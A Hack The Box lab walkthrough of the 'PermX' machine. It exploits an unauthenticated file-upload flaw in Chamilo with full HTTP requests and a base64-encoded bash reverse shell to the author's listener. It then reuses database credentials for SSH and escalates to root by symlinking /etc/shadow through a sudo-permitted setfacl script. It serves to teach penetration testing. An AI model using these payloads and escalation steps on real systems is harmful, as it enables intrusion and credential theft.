---
layout: post
title: Hack The Box Walkthrough - PermX
date: 2024-08-10
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/10/HTB/PermX
img: 2024/10/PermX/PermX.png
---

In this box, I had to exploit a known vulnerability in a web application, find a password in a configuration file, and finally exploit a script that I could run with `sudo`.

* Room: PermX
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/PermX](https://app.hackthebox.com/machines/PermX)
* Author: [mtzsec](https://app.hackthebox.com/users/1573153)

## Enumeration

As always, I started the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.219.228:22
Open 10.129.219.228:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 12:28 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed

...

Nmap scan report for target (10.129.219.228)
Host is up, received echo-reply ttl 63 (0.034s latency).
Scanned at 2024-10-19 12:28:25 EDT for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/19%OT=22%CT=%CU=43391%PV=Y%DS=2%DC=T%G=N%TM=6713DE36%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)

...

Uptime guess: 47.249 days (since Mon Sep  2 06:30:40 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.99 ms 10.10.14.1
2   33.20 ms target (10.129.219.228)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:28
Completed NSE at 12:28, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 42 (3.136KB)
```

It detected two open ports: 22 (SSH) and 80 (HTTP). I ran a scan for UDP ports, but it did not find anything.

## Website

The web server was redirecting to 'permx.htb'. I added the domain to my hosts file and opened it in a browser.

![Website](/assets/images/2024/10/PermX/Website.png "Website")

It was a website for an E-Learning platform. The site did not do much. There were two forms on it: one for a newsletter and a contact form. They did not do anything.

I tried looking for hidden pages with Feroxbuster.

```bash
$ feroxbuster -u http://permx.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://permx.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      303c http://permx.htb/js => http://permx.htb/js/
301      GET        9l       28w      304c http://permx.htb/img => http://permx.htb/img/
200      GET      434l      827w     7929c http://permx.htb/css/style.css
200      GET       56l      315w    34720c http://permx.htb/img/course-1.jpg
200      GET      132l      738w    55021c http://permx.htb/img/cat-2.jpg
200      GET        7l      279w    42766c http://permx.htb/lib/owlcarousel/owl.carousel.min.js
200      GET       94l      537w    57860c http://permx.htb/img/team-3.jpg
200      GET      109l      597w    49102c http://permx.htb/img/team-4.jpg
200      GET      587l     2466w    36182c http://permx.htb/index.html
200      GET        7l      158w     9028c http://permx.htb/lib/waypoints/waypoints.min.js
200      GET        0l        0w        0c http://permx.htb/lib/waypoints/links.php
200      GET      239l     1265w   101629c http://permx.htb/img/carousel-2.jpg
301      GET        9l       28w      304c http://permx.htb/lib => http://permx.htb/lib/
200      GET     3275l     9533w    85368c http://permx.htb/lib/owlcarousel/owl.carousel.js
301      GET        9l       28w      304c http://permx.htb/css => http://permx.htb/css/
200      GET      587l     2466w    36182c http://permx.htb/
200      GET        5l       69w     4677c http://permx.htb/img/testimonial-3.jpg
200      GET        3l      148w     8156c http://permx.htb/lib/wow/wow.min.js
200      GET      158l      719w    58188c http://permx.htb/img/cat-4.jpg
200      GET       11l      188w    16953c http://permx.htb/lib/animate/animate.min.css
200      GET        1l       38w     2302c http://permx.htb/lib/easing/easing.min.js
200      GET      388l     1519w    22993c http://permx.htb/courses.html
200      GET       59l      359w    33963c http://permx.htb/img/team-1.jpg
200      GET      367l     1362w    20542c http://permx.htb/about.html
200      GET     1579l     2856w    23848c http://permx.htb/lib/animate/animate.css
200      GET      542l     1651w    16517c http://permx.htb/lib/wow/wow.js
200      GET      162l     1097w   114385c http://permx.htb/img/carousel-1.jpg
200      GET        6l     3782w   164194c http://permx.htb/css/bootstrap.min.css
200      GET      238l      922w    13018c http://permx.htb/testimonial.html
200      GET      126l      738w    60325c http://permx.htb/img/cat-3.jpg
200      GET      208l      701w    10428c http://permx.htb/404.html
200      GET        8l       81w     5070c http://permx.htb/img/testimonial-4.jpg
200      GET      138l      705w    57467c http://permx.htb/img/cat-1.jpg
200      GET        6l       64w     2936c http://permx.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET       14l       81w     5311c http://permx.htb/img/testimonial-1.jpg
200      GET        6l       80w     5378c http://permx.htb/img/testimonial-2.jpg
200      GET      109l      205w     2698c http://permx.htb/js/main.js
200      GET       41l      273w    28085c http://permx.htb/img/team-2.jpg
200      GET      275l      899w    14753c http://permx.htb/contact.html
200      GET      168l      960w     4092c http://permx.htb/lib/easing/easing.js
200      GET        6l       41w      936c http://permx.htb/lib/owlcarousel/assets/owl.theme.default.min.css
200      GET       50l      141w     1301c http://permx.htb/lib/owlcarousel/assets/owl.theme.green.css
200      GET      275l      912w    14806c http://permx.htb/team.html
200      GET       35l      179w     5340c http://permx.htb/lib/owlcarousel/assets/ajax-loader.gif
200      GET       50l      141w     1303c http://permx.htb/lib/owlcarousel/assets/owl.theme.default.css
200      GET        6l       41w      936c http://permx.htb/lib/owlcarousel/assets/owl.theme.green.min.css
200      GET      170l      431w     4028c http://permx.htb/lib/owlcarousel/assets/owl.carousel.css
200      GET       20l      133w     8179c http://permx.htb/lib/owlcarousel/assets/owl.video.play.png
200      GET      206l     1251w    90219c http://permx.htb/img/about.jpg
200      GET      107l      604w    40660c http://permx.htb/img/course-2.jpg
200      GET      112l      581w    45923c http://permx.htb/img/course-3.jpg
200      GET       23l      172w     1090c http://permx.htb/lib/owlcarousel/LICENSE
[####################] - 2m    119703/119703  0s      found:52      errors:0
[####################] - 2m    119601/119601  1032/s  http://permx.htb/
[####################] - 5s    119601/119601  22280/s http://permx.htb/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s    119601/119601  19694/s http://permx.htb/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s    119601/119601  21965/s http://permx.htb/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    119601/119601  1513937/s http://permx.htb/lib/waypoints/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s    119601/119601  23863/s http://permx.htb/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s    119601/119601  24172/s http://permx.htb/lib/owlcarousel/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    119601/119601  1040009/s http://permx.htb/lib/animate/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    119601/119601  1058416/s http://permx.htb/lib/wow/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    119601/119601  1245844/s http://permx.htb/lib/easing/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    119601/119601  972366/s http://permx.htb/lib/owlcarousel/assets/ => Directory listing (add --scan-dir-listings to scan)
```

It did not find anything interesting.

I scanned for subdomains of the 'permx.htb' domain.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 26 -H "Host:FUZZ.permx.htb" "http://permx.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 653910

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000003:   400        10 L     35 W       301 Ch      "*"
000000007:   400        10 L     35 W       301 Ch      "#www"
000000006:   400        10 L     35 W       301 Ch      "#smtp"
000000004:   400        10 L     35 W       301 Ch      "#mail"
000000005:   400        10 L     35 W       301 Ch      "#pop3"
000313827:   200        352 L    940 W      19347 Ch    "lms"
000594304:   200        586 L    2466 W     36182 Ch    "www"

Total time: 1117.032
Processed Requests: 653910
Filtered Requests: 653903
Requests/sec.: 585.3991
```

This found 'lms.permx.htb'. I added it to my hosts file and took a look at it.

## Chamilo

This domain was running the [Chamilo E-Learning software](https://chamilo.org/en/). 

![Chamilo](/assets/images/2024/10/PermX/ChamiloLogin.png "Chamilo")

A quick search showed that it had an [unauthenticated remote code execution vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) in its file upload functionality. You could access the `bigUpload.php` endpoint without being authenticated and use it to upload any files. Then you could access the new file directly. So it was easy to upload a PHP file and get it to execute any code you wanted.

I found a [POC](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS) to exploit the vulnerability. But it was simple to exploit directly in Caido.

I started by uploading a simple PHP script to validate that it worked.

```http
POST /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported HTTP/1.1
Host: lms.permx.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: ch_sid=m28csg3c9iartsjn9vu1o1otvq
If-Modified-Since: Sat, 20 Jan 2024 18:20:39 GMT
If-None-Match: "55ee-60f64a75fc4e2-gzip"
Priority: u=4
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 23


-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="bigUploadFile"; filename="rce.php"
Content-Type: text/plain

<?php echo 'PWN'; ?>
-----------------------------27067171744469957932680288557--
```

The upload was successful. 

```
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 12:34:39 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The file has successfully been uploaded.
```

Then I tried to access it.

```http
GET /main/inc/lib/javascript/bigupload/files/rce.php HTTP/1.1
Host: lms.permx.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/
Cookie: ch_sid=m28csg3c9iartsjn9vu1o1otvq
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The file was there, and the PHP code was executed.

```http
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 12:35:10 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 3
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

PWN
```

I created a payload to launch a reverse shell. Using `base64` to avoid any special characters.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.53/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQ0NCAwPiYxICAK
```

Then I sent that payload into a file.

```http
POST /main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported HTTP/1.1
Host: lms.permx.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: ch_sid=m28csg3c9iartsjn9vu1o1otvq
If-Modified-Since: Sat, 20 Jan 2024 18:20:39 GMT
If-None-Match: "55ee-60f64a75fc4e2-gzip"
Priority: u=4
Content-Type: multipart/form-data; boundary=---------------------------27067171744469957932680288557
Content-Length: 23


-----------------------------27067171744469957932680288557
Content-Disposition: form-data; name="bigUploadFile"; filename="rce.php"
Content-Type: text/plain

<?php `echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQ0NCAwPiYxICAK|base64 -d|bash`; ?>
-----------------------------27067171744469957932680288557--
```

I started a `netcat` listener and accessed the uploaded file.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.7.27] 55080
bash: cannot set terminal process group (1153): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## User mtz

I was on the server. I started by stabilizing my shell.

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
<ort pty; pty.spawn("/bin/bash")'; export TERM=xterm

www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ^Z
[1]  + 23979 suspended  nc -klvnp 4444

$ stty -a
speed 38400 baud; rows 54; columns 235; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

$ stty raw -echo; fg
[1]  + 23979 continued  nc -klvnp 4444

<milo/main/inc/lib/javascript/bigupload/files$ stty rows 54 cols 235
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

Then, I looked around the website code for credentials. I found the site configuration in `app/config/configuration.php`. It contained the database credentials.

```php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = 'REDACTED';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

The box had only one regular user called 'mtz'. I tried to SSH as that user with the password found in the configuration.

```bash
$ ssh mtz@target
The authenticity of host 'target (10.129.219.228)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
mtz@target's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Oct 19 05:14:44 PM UTC 2024

  System load:           0.1
  Usage of /:            60.0% of 7.19GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.129.219.228
  IPv6 address for eth0: dead:beef::250:56ff:feb0:48cd


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40

mtz@permx:~$ ls
user.txt

mtz@permx:~$ cat user.txt
REDACTED
```

It worked, and I got the user flag.

## Getting root

I checked if the user could run anything with `sudo`.

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

They were able to run a shell script as anyone. I looked at the script.

```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The script was using [setfacl](https://www.man7.org/linux/man-pages/man1/setfacl.1.html) to add permissions to files. It validated that the file had to be in the user's home folder. And that the path did not contain any `..` to avoid something like `/home/mtz/../../etc/shadow`.

I went around the limitation by creating a symlink to the file I wanted to modify in the home folder. I used that to add read permissions on the shadow file, which gave my access to the root password hash.

```bash
mtz@permx:~$ ln -s /etc/shadow . ; sudo /opt/acl.sh mtz r /home/mtz/shadow ; cat /home/mtz/shadow
root:$y$j9T$VEMcaSLaOOvSE3mYgRXRv/$tNXYdTRyCAkwoSHhlyIoCS91clvPEp/hh0r4NTBlmS7:19742:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```

I could have try to crack that hash. But it was simpler to change the root password hash to a hash I knew. I already had mtz password, so I added write permission to the shadow file and copied mtz hash to root.

```bash
mtz@permx:~$ rm shadow
mtz@permx:~$ ln -s /etc/shadow . ; sudo /opt/acl.sh mtz rw /home/mtz/shadow ; vim /home/mtz/shadow
ln: failed to create symbolic link './shadow': File exists
```

Then I could use `su` to connect as root, using the password I found for mtz.

```bash
mtz@permx:~$ su
Password:

root@permx:/home/mtz# cat /root/root.txt
REDACTED
```
